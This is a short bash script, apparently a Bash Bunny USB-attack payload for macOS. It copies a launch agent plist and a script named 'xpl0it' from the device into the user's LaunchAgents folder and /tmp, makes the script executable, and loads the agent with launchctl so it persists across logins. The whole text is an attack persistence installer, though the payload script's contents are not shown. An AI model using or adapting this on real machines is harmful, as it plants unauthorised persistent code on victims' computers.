#!/bin/bash
cp /Volumes/BashBunny/payloads/library/com.xpl0it.plist ~/Library/LaunchAgents
cp /Volumes/BashBunny/payloads/library/xpl0it.sh /tmp
chmod a+x /tmp/xpl0it.sh
launchctl load -w ~/Library/LaunchAgents/com.xpl0it.plist